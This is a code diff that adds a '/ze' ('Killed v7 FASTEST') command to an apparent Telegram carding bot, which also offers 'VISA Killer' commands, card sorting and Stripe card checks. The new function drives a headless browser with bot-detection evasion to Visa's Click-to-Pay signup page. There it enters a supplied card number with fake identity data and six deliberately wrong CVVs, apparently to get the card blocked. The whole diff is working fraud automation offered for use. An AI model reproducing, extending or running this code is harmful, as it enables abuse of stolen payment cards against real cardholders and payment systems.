@@ -60,7 +60,7 @@ start_time = datetime.now()
 USER_DB_FILE = "users.json"
 
 # Commands we gate
-CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "dd", "st", "bt", "sort", "chk", "clean", "num", "adhar")
+CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "dd", "ze", "st", "bt", "sort", "chk", "clean", "num", "adhar")
 
 # Per-command approvals, plus a legacy/global "all" set
 approved_cmds = {k: set() for k in CMD_KEYS}
@@ -1220,7 +1220,8 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• /kd <card> - VISA Killer #2\n"
         "• /ko <card> - VISA Killer #3\n"
         "• /zz <card> - Killed v5 (fast)\n"
-        "• /dd <card> - Killed v6 (ultra-fast)\n\n"
+        "• /dd <card> - Killed v6 (ultra-fast)\n"
+        "• /ze <card> - Killed v7 (FASTEST)\n\n"
         "🔧 *Data Processing:*\n"
         "• /clean <data|file> - Advanced card cleaner\n"
         "• /sort <data|file> - Clean & sort cards\n"
@@ -1420,6 +1421,7 @@ async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lock("/ko <card> — VISA Killer #3", "ko"),
         lock("/zz <card> — Killed v5 (fast)", "zz"),
         lock("/dd <card> — Killed v6 (ultra-fast)", "dd"),
+        lock("/ze <card> — Killed v7 (FASTEST)", "ze"),
     ]))
 
     # Data Processing Tools
@@ -4128,6 +4130,325 @@ async def dd_cmd(update, context):
     }
     Process(target=run_dd_process, args=(card_input, update_dict), daemon=True).start()
 
+# ==== 7.7 /ze Command (Killed v7 — FASTEST, 6 CVV attempts, max optimizations) ==== #
+def run_ze_process(card_input, update_dict):
+    import os, random, traceback, requests, time
+    from selenium import webdriver
+    from selenium.webdriver.chrome.service import Service
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    from selenium.webdriver.common.keys import Keys
+
+    CHROME_PATH = "/usr/bin/google-chrome"
+    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
+    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+
+    def _env_int(name: str, default: int) -> int:
+        raw = os.environ.get(name)
+        if raw is None or str(raw).strip() == "":
+            return default
+        try:
+            return int(str(raw).strip())
+        except Exception:
+            return default
+
+    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)
+
+    def _flag_from_country_code(code: str) -> str:
+        code = (code or "").strip().upper()
+        if len(code) != 2 or not code.isalpha():
+            return ""
+        try:
+            return "".join(chr(ord(c) + 127397) for c in code)
+        except Exception:
+            return ""
+
+    def split_card(card_input):
+        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
+        if len(parts) != 4:
+            raise ValueError("Invalid card format")
+        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]
+
+    def get_bin_info_local(bin_number):
+        try:
+            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=2)
+            if res.status_code == 200:
+                data = res.json()
+                brand = data.get("brand", "Unknown").upper()
+                type_ = data.get("type", "Unknown").upper()
+                country = data.get("country_name", "Unknown")
+                country_code = data.get("country", "") or data.get("country_code", "")
+                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
+                bank = data.get("bank", "Unknown")
+                level = data.get("level", "")
+
+                info_parts = [brand]
+                if type_ and type_ != "UNKNOWN":
+                    info_parts.append(type_)
+                if country and country != "Unknown":
+                    info_parts.append(country)
+                if level and level != "":
+                    info_parts.append(level)
+                if bank and bank != "Unknown":
+                    info_parts.append(bank)
+
+                return " • ".join(info_parts), country_flag
+        except Exception:
+            pass
+        return "Unavailable", ""
+
+    def get_random_email():
+        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"
+
+    def get_fake_data():
+        first = random.choice(["James", "John", "Robert", "Michael", "David"])
+        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
+        phone = "20255501" + ''.join(random.choices('0123456789', k=2))
+        return first, last, "123 Elm Street", "New York", "NY", "10001", phone
+
+    def get_wrong_cvv(exclude):
+        while True:
+            fake = ''.join(random.choices('0123456789', k=3))
+            if fake != exclude:
+                return fake
+
+    def edit_message(text):
+        payload = {
+            "chat_id": update_dict["chat_id"],
+            "message_id": update_dict["message_id"],
+            "text": text,
+            "parse_mode": "Markdown"
+        }
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+        try:
+            requests.post(url, data=payload, timeout=3)
+        except Exception:
+            pass
+
+    def admin_report(trace, driver=None):
+        sent = False
+        screenshot_path = "ze_fail.png"
+        if driver:
+            try:
+                driver.save_screenshot(screenshot_path)
+                with open(screenshot_path, "rb") as img:
+                    files = {"photo": img}
+                    payload = {
+                        "chat_id": BOT_ADMIN_ID,
+                        "caption": f"ZE Error:\n```\n{trace[:900]}\n```",
+                        "parse_mode": "Markdown"
+                    }
+                    requests.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                        data=payload,
+                        files=files,
+                        timeout=8
+                    )
+                sent = True
+                os.remove(screenshot_path)
+            except Exception:
+                pass
+        if not sent:
+            try:
+                payload = {
+                    "chat_id": BOT_ADMIN_ID,
+                    "text": f"ZE Error (no screenshot):\n```\n{trace[:900]}\n```",
+                    "parse_mode": "Markdown"
+                }
+                requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    data=payload,
+                    timeout=3
+                )
+            except Exception:
+                pass
+
+    start = time.time()
+    driver = None
+
+    try:
+        edit_message("🚀 Processing (FASTEST)...")
+
+        options = webdriver.ChromeOptions()
+        options.binary_location = CHROME_PATH
+        options.add_argument("--headless=new")
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--disable-gpu")
+        options.add_argument("--disable-extensions")
+        options.add_argument("--disable-infobars")
+        options.add_argument("--disable-notifications")
+        options.add_argument("--disable-popup-blocking")
+        options.add_argument("--blink-settings=imagesEnabled=false")
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        options.add_argument("--window-size=1280,720")
+        options.add_argument("--disable-logging")
+        options.add_argument("--log-level=3")
+        options.add_argument("--silent")
+        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
+        options.add_experimental_option('useAutomationExtension', False)
+        # Fastest page load - don't wait for anything
+        prefs = {
+            "profile.managed_default_content_settings.images": 2,
+            "profile.managed_default_content_settings.stylesheets": 2,
+            "profile.managed_default_content_settings.fonts": 2,
+        }
+        options.add_experimental_option("prefs", prefs)
+        try:
+            options.set_capability("pageLoadStrategy", "eager")
+        except Exception:
+            pass
+
+        service = Service(executable_path=CHROME_DRIVER_PATH)
+        driver = webdriver.Chrome(service=service, options=options)
+        driver.set_page_load_timeout(10)
+        wait = WebDriverWait(driver, 1.5)  # FASTEST - 1.5s timeout
+
+        driver.get("https://src.visa.com/login")
+
+        # Quick cookie dismiss
+        try:
+            btn = driver.find_element(By.CSS_SELECTOR, ".wscrOk")
+            driver.execute_script("arguments[0].click();", btn)
+        except Exception:
+            pass
+
+        # Fill email and proceed
+        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
+        driver.find_element(By.CSS_SELECTOR, '[data-testid="continue-button"]').click()
+        
+        time.sleep(0.3)  # Minimal wait
+        
+        try:
+            wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
+        except:
+            driver.find_element(By.CSS_SELECTOR, '[data-testid="terms-checkbox"]').click()
+        
+        driver.find_element(By.CSS_SELECTOR, '[data-testid="next-button"]').click()
+
+        cc, mm, yy, real_cvv = split_card(card_input)
+        bin_info, bin_flag = get_bin_info_local(cc[:6])
+        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
+
+        wrong_cvv = get_wrong_cvv(real_cvv)
+        first_name, last_name, address, city, state, zip_code, phone = get_fake_data()
+
+        # Wait for card form and fill using JavaScript for speed
+        wait.until(EC.visibility_of_element_located((By.ID, "card-input")))
+        
+        # Batch fill using JavaScript - FASTEST method
+        fill_script = """
+        document.getElementById('card-input').value = arguments[0];
+        document.getElementById('card-input').dispatchEvent(new Event('input', {bubbles: true}));
+        document.getElementById('expiration-input').value = arguments[1];
+        document.getElementById('expiration-input').dispatchEvent(new Event('input', {bubbles: true}));
+        document.getElementById('cvv-input').value = arguments[2];
+        document.getElementById('cvv-input').dispatchEvent(new Event('input', {bubbles: true}));
+        document.getElementById('first-name-input').value = arguments[3];
+        document.getElementById('first-name-input').dispatchEvent(new Event('input', {bubbles: true}));
+        document.getElementById('last-name-input').value = arguments[4];
+        document.getElementById('last-name-input').dispatchEvent(new Event('input', {bubbles: true}));
+        document.getElementById('line1-input').value = arguments[5];
+        document.getElementById('line1-input').dispatchEvent(new Event('input', {bubbles: true}));
+        document.getElementById('city-input').value = arguments[6];
+        document.getElementById('city-input').dispatchEvent(new Event('input', {bubbles: true}));
+        document.getElementById('stateProvinceCode-input').value = arguments[7];
+        document.getElementById('stateProvinceCode-input').dispatchEvent(new Event('input', {bubbles: true}));
+        document.getElementById('zip-input').value = arguments[8];
+        document.getElementById('zip-input').dispatchEvent(new Event('input', {bubbles: true}));
+        document.getElementById('card-phone-input-number').value = arguments[9];
+        document.getElementById('card-phone-input-number').dispatchEvent(new Event('input', {bubbles: true}));
+        """
+        driver.execute_script(fill_script, cc, mm + yy, wrong_cvv, first_name, last_name, address, city, state, zip_code, phone)
+
+        # Country selection
+        try:
+            country_box = driver.find_element(By.CSS_SELECTOR, '[data-testid="region-select"]')
+            country_val = country_box.get_attribute('value')
+            if not country_val or ("United States" not in country_val):
+                driver.execute_script("""
+                    var el = arguments[0];
+                    el.click();
+                    el.value = 'United States';
+                    el.dispatchEvent(new Event('input', {bubbles: true}));
+                """, country_box)
+                country_box.send_keys(Keys.ENTER)
+        except Exception:
+            pass
+
+        # Click submit
+        add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
+        driver.execute_script("arguments[0].click();", add_card_btn)
+
+        edit_message("🚀 Updating (FASTEST)...")
+
+        # 6 CVV attempts - using JS for speed
+        TOTAL_TRIES = 6
+        used_cvvs = {wrong_cvv}
+        for _ in range(TOTAL_TRIES - 1):
+            while True:
+                fake_cvv = ''.join(random.choices('0123456789', k=3))
+                if fake_cvv not in used_cvvs:
+                    used_cvvs.add(fake_cvv)
+                    break
+            try:
+                time.sleep(0.2)  # Minimal delay
+                driver.execute_script("""
+                    var cvv = document.getElementById('cvv-input');
+                    cvv.value = arguments[0];
+                    cvv.dispatchEvent(new Event('input', {bubbles: true}));
+                    document.querySelector('button[data-testid="submit-button"]').click();
+                """, fake_cvv)
+            except Exception:
+                pass
+
+        duration = round(time.time() - start, 2)
+        edit_message(
+            f"💳 **Card:** `{short_card}`\n"
+            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
+            f"1 Procceed\n"
+            f"2 Processed\n\n"
+            f"🚀 **Status:** Killed v7 FASTEST\n"
+            f"⏱ **Time:** {duration}s"
+        )
+
+    except Exception as e:
+        trace = traceback.format_exc()
+        edit_message(f"❌ ZE Error: `{e}`")
+        admin_report(trace, driver)
+    finally:
+        try:
+            if driver:
+                driver.quit()
+        except Exception:
+            pass
+
+
+async def ze_cmd(update, context):
+    uid = update.effective_user.id
+    if not is_approved(uid, "ze"):
+        await update.message.reply_text("⛔ You are not approved to use /ze", reply_to_message_id=update.message.message_id)
+        return
+
+    if not is_cmd_enabled("ze"):
+        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
+        return
+
+    raw_input = " ".join(context.args) if context.args else ""
+    card_input = extract_card_input(raw_input)
+    if not card_input:
+        await update.message.reply_text("❌ Invalid card.\nUse: `/ze 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
+        return
+
+    msg = await update.message.reply_text("🚀 Processing (FASTEST)...", reply_to_message_id=update.message.message_id)
+    update_dict = {
+        "user_id": uid,
+        "chat_id": update.effective_chat.id,
+        "message_id": msg.message_id
+    }
+    Process(target=run_ze_process, args=(card_input, update_dict), daemon=True).start()
+
 # ==== 8. STRIPE AUTH V1 (/st) — Single Only (batch removed) ==== #
 def extract_all_card_inputs(raw_text: str):
     t = (raw_text or "").replace("\r", "\n")
@@ -5695,6 +6016,7 @@ async def main():
         app.add_handler(CommandHandler("ko", ko_cmd))
         app.add_handler(CommandHandler("zz", zz_cmd))
         app.add_handler(CommandHandler("dd", dd_cmd))
+        app.add_handler(CommandHandler("ze", ze_cmd))
         app.add_handler(CommandHandler("st", st_cmd))
         app.add_handler(CommandHandler("bt", bt_cmd))
         app.add_handler(CommandHandler("chk", chk_cmd))
